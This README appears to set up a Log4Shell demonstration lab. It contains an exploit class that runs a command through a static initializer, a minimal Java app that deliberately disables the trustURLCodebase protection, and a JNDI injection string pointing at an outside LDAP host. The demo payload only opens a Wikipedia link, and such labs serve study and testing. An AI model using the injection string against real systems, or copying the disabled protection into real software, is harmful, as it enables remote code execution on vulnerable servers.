# Simple Log4Shell LDAP server

## Exploit class to execute it remotly
```java
public class Magic {
  static {
    try {
      // Execute the `open` command to open a funny wikipedia link.
      String[] cmds = { "open", "https://en.wikipedia.org/wiki/Ostrich_algorithm" };
      Runtime.getRuntime().exec(cmds).waitFor();
    } catch (Exception e) {
      e.printStackTrace();
    } 
  }
}
```

## Minimum vulnerable application
```java
public class Log4j {

    private static final Logger logger = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) {
        // Log4Shell will not be able to load remote code from untrusted code bases since the Java 8 version.
        // This statement will disable that security path to be able to test it on Java 8 and higher.
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.println("Introduce a message to log:");
            String line = scanner.nextLine();
            logger.error(line);
        }
    }

}
```

## Vulnerable message example

You will need to replace the `nurio.me` domain to your LDAP server, for local development it could be `localhost`.
```
${jndi:ldap://nurio.me:1389/a}
```
